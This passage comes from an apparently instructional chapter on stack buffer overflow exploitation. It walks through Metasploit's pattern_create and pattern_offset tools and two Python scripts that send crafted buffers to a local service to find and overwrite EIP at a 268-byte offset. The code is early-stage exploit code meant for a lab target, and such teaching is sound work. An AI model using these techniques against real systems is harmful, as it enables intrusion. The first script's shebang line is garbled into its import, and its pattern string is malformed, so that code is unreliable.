## Using pattern_offset

Metasploit has two helper scripts that are used frequently in the exploit development process. The first is pattern_create.rb which can be found in /usr/share/metasploit-framework/tools/exploit/. This script takes one argument: the length of the buffer we would like to create. The second is pattern_offset.rb, a tool that will take our output from pattern_create.rb and return the location of the EIP when the application crashes. By specifying 2048 as the length to pattern_create, we can generate a string that we use to find the exact length of our EIP overwrite as well as get a better idea of how much data is being stored in our buffer for later use. The string contains characters in a unique sequence that will allow us to input the value of EIP into another script to determine the exact length where EIP was overwritten. We take the string that is output by pattern_create and place it in our buf variable.

```python
#!/usr/bin/python evenimport socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
s.connect((host, port))
print(s.recv(1024))
buf="Aa0a1Aa2Aa3Aa4Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab8"
s.send(buf)
print(s.recv(1024))
s.close # Close the socket when done
```

Our new code replaces the A’s from our original script. We restart our program in gdb again by typing in “r” and then we run our new exp.py. We can see the results in Fig. 9.5 where we get back a portion of our code as output and we see that EIP has been overwritten with a different value.

## Controlling EIP

Now we know how many characters have to be overwritten for EIP. We need to verify that we are correct. We do this by building our exploit so that our original characters up to A's, our EIP consists of B's, and the rest of exploit buffer is made up of C's.

```python
#!/usr/bin/python
import socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
eip = "BBBB"
buf = "A"*268 + eip
buf += "C"*(1024-len(buf))
s.connect((host, port))
print(s.recv(1024))
s.send(buf)
print(s.recv(1024))
s.close()
```

Our new code sets the EIP value to “BBBB” and then creates an exploit buffer of 268 characters, EIP overwrite of B's and then finishes out 1024 length buffer with C's. When we restart our program in gdb and run our new code, we should see output similar to Fig. 9.6.
